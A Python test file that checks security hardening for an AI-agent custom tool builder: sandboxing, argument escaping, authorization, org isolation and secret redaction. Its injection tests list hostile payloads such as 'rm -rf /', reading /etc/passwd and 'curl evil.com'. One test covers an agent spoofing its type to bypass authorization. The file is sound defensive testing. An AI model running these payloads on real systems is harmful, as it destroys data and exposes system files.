"""
Visual Tool Builder — Security & Isolation Hardening Tests

Proves:
1. Python custom tools execute inside sandbox, never on host
2. Bash custom tools remain sandboxed
3. Malicious shell arguments cannot escape
4. Malicious Python arguments cannot inject code
5. Invalid schemas are rejected
6. Unauthorized agent invocation is rejected
7. Cross-org tool access is rejected
8. Disabled/deleted tools cannot execute
9. Timeout/resource restrictions apply (via sandbox delegation)
10. Runtime tool registration remains consistent after cache invalidation
11. HTTP tools are explicitly UNIMPLEMENTED
12. Audit logging redacts secrets
"""
import pytest
import json
import re
from unittest.mock import patch, MagicMock

from backend.models.tool import CustomTool, ToolExecutionType
from backend.services.tool_registry import ToolRegistry, ToolDefinition
from backend.api.v1.tools import (
    _register_custom_tool_in_memory,
    _validate_input_schema,
    _validate_args_against_schema,
    _serialize_args_for_bash,
    _serialize_args_for_python,
    _log_execution,
    load_custom_tools_on_startup,
)

# ── Fixtures ──────────────────────────────────────────────────────────────

VALID_SCHEMA = {
    "type": "object",
    "properties": {
        "pattern": {"type": "string"},
    },
    "required": ["pattern"],
}


def _make_tool(
    name="test_tool",
    org_id="org-1",
    exec_type="bash",
    code="echo $TOOL_ARG_PATTERN",
    agents=None,
    enabled=True,
    schema=None,
):
    return CustomTool(
        id=f"tool-{name}",
        organization_id=org_id,
        name=name,
        description=f"Test tool: {name}",
        input_schema=schema or VALID_SCHEMA,
        execution_type=exec_type,
        execution_code=code,
        assigned_agents_json=json.dumps(agents or []),
        enabled=enabled,
    )


# ── 1. Python executes inside sandbox, never host ─────────────────────────

@pytest.mark.asyncio
async def test_python_tool_executes_inside_sandbox_not_host():
    """
    The old code ran exec(script) on the backend host.
    The hardened code must write to sandbox fs and run via SandboxManager.run_command.
    """
    tool = _make_tool(
        name="py_sandbox_test",
        exec_type="python",
        code="result = _tool_args['val'] * 10\nprint(result)",
        agents=["BACKEND_ENGINEER"],
        schema={
            "type": "object",
            "properties": {"val": {"type": "number"}},
            "required": ["val"],
        },
    )
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("py_sandbox_test")

    context = {
        "sandbox_session_id": "sbx-001",
        "agent_type": "BACKEND_ENGINEER",
        "organization_id": "org-1",
    }

    with patch("backend.services.sandbox_manager.SandboxManager.write_file") as mock_write, \
         patch("backend.services.sandbox_manager.SandboxManager.run_command") as mock_run:
        mock_run.return_value = {"stdout": "420", "exit_code": 0}

        result = await registered.execute(context=context, val=42)

        # Prove: write_file was called to write the script into the sandbox
        mock_write.assert_called_once()
        call_args = mock_write.call_args
        assert call_args[0][0] == "sbx-001"  # session_id
        assert ".kobits_tool_py_sandbox_test.py" in call_args[0][1]  # temp file
        written_script = call_args[0][2]
        assert "import json" in written_script  # safe arg preamble
        assert "_tool_args" in written_script

        # Prove: run_command was called with "python <file>" inside sandbox
        mock_run.assert_called_once()
        run_args = mock_run.call_args
        assert run_args[0][0] == "sbx-001"
        assert "python .kobits_tool_py_sandbox_test.py" in run_args[0][1]

        assert result.get("success") is True

    # Cleanup
    ToolRegistry.unregister("py_sandbox_test")


# ── 2. Bash tool remains sandboxed ───────────────────────────────────────

@pytest.mark.asyncio
async def test_bash_tool_executes_in_sandbox():
    tool = _make_tool(name="bash_sbx", exec_type="bash", code="echo $TOOL_ARG_PATTERN")
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("bash_sbx")

    context = {"sandbox_session_id": "sbx-002", "organization_id": "org-1"}

    with patch("backend.services.sandbox_manager.SandboxManager.run_command") as mock_run:
        mock_run.return_value = {"stdout": "hello", "exit_code": 0}
        result = await registered.execute(context=context, pattern="hello")

        mock_run.assert_called_once()
        script = mock_run.call_args[0][1]
        assert "export TOOL_ARG_PATTERN=" in script
        assert result.get("success") is True

    ToolRegistry.unregister("bash_sbx")


# ── 3. No sandbox → hard fail ────────────────────────────────────────────

@pytest.mark.asyncio
async def test_custom_tool_requires_sandbox():
    tool = _make_tool(name="no_sbx_test")
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("no_sbx_test")

    # No sandbox_session_id
    result = await registered.execute(context={}, pattern="test")
    assert "error" in result
    assert "sandbox" in result["error"].lower()

    # No context at all
    result2 = await registered.execute(context=None, pattern="test")
    assert "error" in result2

    ToolRegistry.unregister("no_sbx_test")


# ── 4. Malicious shell arguments are safely escaped ──────────────────────

@pytest.mark.asyncio
async def test_malicious_bash_args_escaped():
    import shlex
    tool = _make_tool(name="shell_escape_test", exec_type="bash", code="echo $TOOL_ARG_PATTERN")
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("shell_escape_test")

    context = {"sandbox_session_id": "sbx-003", "organization_id": "org-1"}

    malicious_inputs = [
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`whoami`",
        "' || echo pwned ||'",
        "\" && curl evil.com &&\"",
    ]

    for payload in malicious_inputs:
        with patch("backend.services.sandbox_manager.SandboxManager.run_command") as mock_run:
            mock_run.return_value = {"stdout": "", "exit_code": 0}
            await registered.execute(context=context, pattern=payload)

            script = mock_run.call_args[0][1]
            assert "export TOOL_ARG_PATTERN=" in script

            # Extract the value assigned to TOOL_ARG_PATTERN
            export_line = [l for l in script.split("\n") if "TOOL_ARG_PATTERN=" in l][0]
            assigned_value = export_line.split("=", 1)[1]

            # The value MUST be the shlex.quote'd version of the payload.
            # shlex.quote wraps in single quotes and escapes internal single quotes.
            expected_quoted = shlex.quote(payload)
            assert assigned_value == expected_quoted, (
                f"Expected shlex.quote({payload!r}) = {expected_quoted!r}, got {assigned_value!r}"
            )

    ToolRegistry.unregister("shell_escape_test")


# ── 5. Malicious Python arguments cannot inject code ─────────────────────

def test_python_arg_serialization_prevents_injection():
    malicious = {
        "val": "__import__('os').system('rm -rf /')",
        "key": "'; import subprocess; subprocess.call('whoami'); #",
    }
    preamble = _serialize_args_for_python(malicious)
    # Args are JSON-serialized strings, not executed as code
    assert "import json" in preamble
    assert "_tool_args = json.loads(" in preamble
    # The malicious code must be inside a JSON string, not executable
    assert "__import__" not in preamble.split("json.loads(")[0]


# ── 6. Invalid schemas are rejected ──────────────────────────────────────

def test_invalid_schemas_rejected():
    assert _validate_input_schema({"type": "object", "properties": {}}) is True
    assert _validate_input_schema({"type": "array"}) is False
    assert _validate_input_schema("not_a_dict") is False
    assert _validate_input_schema({"type": "object", "properties": {"x": "bad"}}) is False
    assert _validate_input_schema({"type": "object", "properties": {"x": {}}}) is False


# ── 7. Argument validation against schema ────────────────────────────────

def test_arg_validation():
    schema = {
        "type": "object",
        "properties": {"name": {"type": "string"}, "count": {"type": "number"}},
        "required": ["name"],
    }
    assert _validate_args_against_schema({"name": "test"}, schema) is None
    assert _validate_args_against_schema({"name": "test", "count": 5}, schema) is None
    assert "Missing" in _validate_args_against_schema({}, schema)
    assert "Unknown" in _validate_args_against_schema({"name": "ok", "extra": 1}, schema)
    assert "must be a string" in _validate_args_against_schema({"name": 123}, schema)
    assert "must be a number" in _validate_args_against_schema({"name": "ok", "count": "bad"}, schema)


# ── 8. Unauthorized agent invocation is rejected ─────────────────────────

@pytest.mark.asyncio
async def test_unauthorized_agent_rejected():
    tool = _make_tool(name="auth_test", agents=["BACKEND_ENGINEER", "QA_ENGINEER"])
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("auth_test")

    context = {
        "sandbox_session_id": "sbx-004",
        "agent_type": "FRONTEND_ENGINEER",  # Not authorized
        "organization_id": "org-1",
    }

    result = await registered.execute(context=context, pattern="test")
    assert "error" in result
    assert "not authorized" in result["error"]

    ToolRegistry.unregister("auth_test")


@pytest.mark.asyncio
async def test_authorized_agent_accepted():
    tool = _make_tool(name="auth_ok_test", agents=["BACKEND_ENGINEER"])
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("auth_ok_test")

    context = {
        "sandbox_session_id": "sbx-005",
        "agent_type": "BACKEND_ENGINEER",
        "organization_id": "org-1",
    }

    with patch("backend.services.sandbox_manager.SandboxManager.run_command") as mock_run:
        mock_run.return_value = {"stdout": "ok", "exit_code": 0}
        result = await registered.execute(context=context, pattern="test")
        assert result.get("success") is True

    ToolRegistry.unregister("auth_ok_test")


# ── 9. Cross-org tool access is rejected ─────────────────────────────────

@pytest.mark.asyncio
async def test_cross_org_access_rejected():
    tool = _make_tool(name="org_iso_test", org_id="org-alpha")
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("org_iso_test")

    context = {
        "sandbox_session_id": "sbx-006",
        "organization_id": "org-beta",  # Different org
    }

    result = await registered.execute(context=context, pattern="test")
    assert "error" in result
    assert "not available" in result["error"].lower()

    ToolRegistry.unregister("org_iso_test")


@pytest.mark.asyncio
async def test_same_org_access_allowed():
    tool = _make_tool(name="org_ok_test", org_id="org-alpha")
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("org_ok_test")

    context = {"sandbox_session_id": "sbx-007", "organization_id": "org-alpha"}

    with patch("backend.services.sandbox_manager.SandboxManager.run_command") as mock_run:
        mock_run.return_value = {"stdout": "ok", "exit_code": 0}
        result = await registered.execute(context=context, pattern="test")
        assert result.get("success") is True

    ToolRegistry.unregister("org_ok_test")


# ── 10. Disabled tools cannot execute ────────────────────────────────────

@pytest.mark.asyncio
async def test_disabled_tool_cannot_execute():
    tool = _make_tool(name="disabled_test", enabled=False)
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("disabled_test")

    context = {"sandbox_session_id": "sbx-008", "organization_id": "org-1"}
    result = await registered.execute(context=context, pattern="test")
    assert "error" in result
    assert "disabled" in result["error"].lower()

    ToolRegistry.unregister("disabled_test")


# ── 11. Deleted tools are removed from cache ─────────────────────────────

def test_deleted_tool_removed_from_cache():
    tool = _make_tool(name="delete_cache_test")
    _register_custom_tool_in_memory(tool)
    assert ToolRegistry.get_tool("delete_cache_test") is not None

    ToolRegistry.unregister("delete_cache_test")
    assert ToolRegistry.get_tool("delete_cache_test") is None


# ── 12. HTTP tools return UNIMPLEMENTED ──────────────────────────────────

@pytest.mark.asyncio
async def test_http_tool_returns_unimplemented():
    tool = _make_tool(name="http_test", exec_type="http", code="https://example.com")
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("http_test")

    context = {"sandbox_session_id": "sbx-009", "organization_id": "org-1"}
    result = await registered.execute(context=context, pattern="test")
    assert "error" in result
    assert "UNIMPLEMENTED" in result["error"]

    ToolRegistry.unregister("http_test")


# ── 13. Timeout is delegated to sandbox ──────────────────────────────────

@pytest.mark.asyncio
async def test_timeout_delegated_to_sandbox():
    tool = _make_tool(name="timeout_test", exec_type="bash", code="sleep 100")
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("timeout_test")

    context = {"sandbox_session_id": "sbx-010", "organization_id": "org-1"}

    with patch("backend.services.sandbox_manager.SandboxManager.run_command") as mock_run:
        mock_run.return_value = {"stdout": "", "exit_code": 0}
        await registered.execute(context=context, pattern="test")

        # Verify timeout=30 is passed to SandboxManager
        call_kwargs = mock_run.call_args
        assert call_kwargs[1].get("timeout") == 30

    ToolRegistry.unregister("timeout_test")


# ── 14. Audit logging redacts secrets ────────────────────────────────────

@patch('backend.api.v1.tools.logger.info')
def test_audit_log_redacts_secrets(mock_logger_info):
    _log_execution(
        context={"mission_id": "m1", "task_id": "t1", "agent_type": "BE"},
        tool_name="test_tool",
        tool_id="tid",
        args={"pattern": "hello", "api_secret": "sk-12345", "token": "abc"},
        result={"stdout": "ok"},
    )
    
    assert mock_logger_info.called
    log_msg = mock_logger_info.call_args[0][0]
    assert "hello" in log_msg
    assert "sk-12345" not in log_msg
    assert "***" in log_msg


# ── 15. Tool re-registration after update ────────────────────────────────

def test_tool_update_invalidates_and_re_registers():
    tool = _make_tool(name="update_test", agents=["QA_ENGINEER"])
    _register_custom_tool_in_memory(tool)

    old = ToolRegistry.get_tool("update_test")
    assert "QA_ENGINEER" in old.assigned_agents

    # Simulate update: unregister, change, re-register
    ToolRegistry.unregister("update_test")
    tool.assigned_agents_json = json.dumps(["BACKEND_ENGINEER"])
    _register_custom_tool_in_memory(tool)

    updated = ToolRegistry.get_tool("update_test")
    assert "BACKEND_ENGINEER" in updated.assigned_agents
    assert "QA_ENGINEER" not in updated.assigned_agents

    ToolRegistry.unregister("update_test")


# ── 16. shlex.quote proves injection safety ──────────────────────────────

def test_shlex_quote_safety():
    dangerous = [
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`whoami`",
        "hello' && echo pwned && echo '",
    ]
    for payload in dangerous:
        exports = _serialize_args_for_bash({"x": payload})
        # shlex.quote wraps in single quotes
        assert "'" in exports
        # The raw payload cannot appear as an unquoted command
        lines = exports.split("\n")
        for line in lines:
            if "TOOL_ARG_X=" in line:
                val_part = line.split("=", 1)[1]
                # Must be single-quoted
                assert val_part.startswith("'")
                assert val_part.endswith("'")


# ══════════════════════════════════════════════════════════════════════════
# FOLLOW-UP HARDENING TESTS
# ══════════════════════════════════════════════════════════════════════════

# ── 17. Server restart persistence ───────────────────────────────────────

@pytest.mark.asyncio
async def test_startup_loads_enabled_tools():
    """Simulate startup: enabled tools are loaded into ToolRegistry."""
    enabled_tool = _make_tool(name="startup_enabled", enabled=True)
    disabled_tool = _make_tool(name="startup_disabled", enabled=False)

    mock_result = MagicMock()
    mock_result.scalars().all.return_value = [enabled_tool]  # Only enabled

    mock_db = MagicMock()
    mock_db.execute = MagicMock(return_value=mock_result)

    class AsyncContextManagerMock:
        async def __aenter__(self): return mock_db
        async def __aexit__(self, *args): pass

    # Clear any previous registration
    ToolRegistry.unregister("startup_enabled")
    ToolRegistry.unregister("startup_disabled")

    with patch("backend.core.database.AsyncSessionLocal", return_value=AsyncContextManagerMock()):
        # Patch execute to be an awaitable
        import asyncio
        async def mock_execute(stmt):
            return mock_result
        mock_db.execute = mock_execute

        count = await load_custom_tools_on_startup()

    assert count == 1
    assert ToolRegistry.get_tool("startup_enabled") is not None
    # disabled_tool was not in the DB query result, so it must NOT be registered
    assert ToolRegistry.get_tool("startup_disabled") is None

    ToolRegistry.unregister("startup_enabled")


@pytest.mark.asyncio
async def test_startup_does_not_restore_deleted_tools():
    """Deleted tools are not in the DB, so they cannot be restored on startup."""
    # Register then delete
    tool = _make_tool(name="startup_deleted")
    _register_custom_tool_in_memory(tool)
    assert ToolRegistry.get_tool("startup_deleted") is not None
    ToolRegistry.unregister("startup_deleted")
    assert ToolRegistry.get_tool("startup_deleted") is None

    # Simulate startup with empty DB result
    mock_result = MagicMock()
    mock_result.scalars().all.return_value = []

    mock_db = MagicMock()
    async def mock_execute(stmt):
        return mock_result
    mock_db.execute = mock_execute

    class AsyncContextManagerMock:
        async def __aenter__(self): return mock_db
        async def __aexit__(self, *args): pass

    with patch("backend.core.database.AsyncSessionLocal", return_value=AsyncContextManagerMock()):
        count = await load_custom_tools_on_startup()

    assert count == 0
    assert ToolRegistry.get_tool("startup_deleted") is None


@pytest.mark.asyncio
async def test_startup_loads_updated_definition():
    """Updated tool loads with its latest definition, not a stale cached one."""
    tool = _make_tool(name="startup_update_test", agents=["QA_ENGINEER"])

    mock_result = MagicMock()
    mock_result.scalars().all.return_value = [tool]

    mock_db = MagicMock()
    async def mock_execute(stmt):
        return mock_result
    mock_db.execute = mock_execute

    class AsyncContextManagerMock:
        async def __aenter__(self): return mock_db
        async def __aexit__(self, *args): pass

    with patch("backend.core.database.AsyncSessionLocal", return_value=AsyncContextManagerMock()):
        await load_custom_tools_on_startup()

    registered = ToolRegistry.get_tool("startup_update_test")
    assert "QA_ENGINEER" in registered.assigned_agents

    # Now simulate update: change agents to BACKEND_ENGINEER
    tool.assigned_agents_json = json.dumps(["BACKEND_ENGINEER"])
    mock_result.scalars().all.return_value = [tool]

    # Clear and reload
    ToolRegistry.unregister("startup_update_test")

    with patch("backend.core.database.AsyncSessionLocal", return_value=AsyncContextManagerMock()):
        await load_custom_tools_on_startup()

    reloaded = ToolRegistry.get_tool("startup_update_test")
    assert "BACKEND_ENGINEER" in reloaded.assigned_agents
    assert "QA_ENGINEER" not in reloaded.assigned_agents

    ToolRegistry.unregister("startup_update_test")


# ── 18. Trusted agent authorization (spoof prevention) ───────────────────

@pytest.mark.asyncio
async def test_spoofed_agent_type_in_args_ignored():
    """
    An LLM agent cannot bypass authorization by passing agent_type in its
    tool-call kwargs. The agent_type in context is set by AgentExecutor
    from trusted state (agent_run + agent_type param).
    """
    tool = _make_tool(name="spoof_test", agents=["BACKEND_ENGINEER"])
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("spoof_test")

    # Context says FRONTEND_ENGINEER (set by trusted AgentExecutor)
    context = {
        "sandbox_session_id": "sbx-spoof",
        "agent_type": "FRONTEND_ENGINEER",  # Trusted: NOT authorized
        "organization_id": "org-1",
    }

    # Attacker tries to pass agent_type as a tool argument to override
    result = await registered.execute(
        context=context,
        pattern="test",
        agent_type="BACKEND_ENGINEER",  # Spoofed in kwargs — must be ignored
    )

    # Authorization MUST fail because the trusted context says FRONTEND_ENGINEER
    assert "error" in result
    assert "not authorized" in result["error"]

    ToolRegistry.unregister("spoof_test")


@pytest.mark.asyncio
async def test_missing_agent_type_in_context_still_allows_if_no_assignment():
    """
    If a tool has no assigned_agents restriction, missing agent_type is OK.
    """
    tool = _make_tool(name="open_tool_test", agents=[])  # No assignment restriction
    _register_custom_tool_in_memory(tool)
    registered = ToolRegistry.get_tool("open_tool_test")

    context = {
        "sandbox_session_id": "sbx-open",
        "organization_id": "org-1",
        # No agent_type — should be fine since tool has no agent restrictions
    }

    with patch("backend.services.sandbox_manager.SandboxManager.run_command") as mock_run:
        mock_run.return_value = {"stdout": "ok", "exit_code": 0}
        result = await registered.execute(context=context, pattern="test")
        assert result.get("success") is True

    ToolRegistry.unregister("open_tool_test")


# ── 19. Persisted audit trail ────────────────────────────────────────────

@pytest.mark.asyncio
async def test_audit_trail_persists_tool_execution():
    """
    Verify that _persist_tool_activity is called when a tool executes,
    and that it writes an ActivityLog with TOOL_EXECUTED type.
    """
    from backend.api.v1.tools import _persist_tool_activity

    with patch("backend.core.database.AsyncSessionLocal") as mock_session_cls:
        mock_db = MagicMock()
        async def noop(*a, **kw):
            pass
        mock_db.commit = noop
        
        class AsyncContextManagerMock:
            async def __aenter__(self): return mock_db
            async def __aexit__(self, *args): pass
            
        mock_session_cls.return_value = AsyncContextManagerMock()

        with patch("backend.services.activity_service.log_activity") as mock_log:
            async def log_side_effect(**kwargs):
                return MagicMock()
            mock_log.side_effect = log_side_effect

            await _persist_tool_activity(
                context={"organization_id": "org-test", "mission_id": "m1", "task_id": "t1", "agent_type": "BE"},
                tool_name="test_tool",
                tool_id="tid",
                description="tool=test_tool success=True"
            )

            mock_log.assert_called_once()
            call_kwargs = mock_log.call_args[1]
            assert call_kwargs["organization_id"] == "org-test"
            assert call_kwargs["title"] == "Custom tool executed: test_tool"
            assert "test_tool" in call_kwargs["description"]


@pytest.mark.asyncio
async def test_audit_trail_skips_without_org_id():
    """If no organization_id in context, audit persistence is safely skipped."""
    from backend.api.v1.tools import _persist_tool_activity

    with patch("backend.services.activity_service.log_activity") as mock_log:
        await _persist_tool_activity(
            context={"mission_id": "m1"},  # No organization_id
            tool_name="test_tool",
            tool_id="tid",
            description="should not persist"
        )
        # log_activity must NOT be called
        mock_log.assert_not_called()


# ── 20. HTTP tools remain explicitly UNIMPLEMENTED ───────────────────────

def test_http_execution_type_blocked_in_validation():
    """The Pydantic validator must reject execution_type=http at creation time."""
    from pydantic import ValidationError
    from backend.api.v1.tools import CustomToolCreate

    with pytest.raises(ValidationError) as exc_info:
        CustomToolCreate(
            name="http_blocked",
            description="Should fail",
            input_schema={"type": "object", "properties": {}},
            execution_type="http",
            execution_code="https://evil.com",
            assigned_agents=["BACKEND_ENGINEER"],
        )

    assert "not yet implemented" in str(exc_info.value).lower()
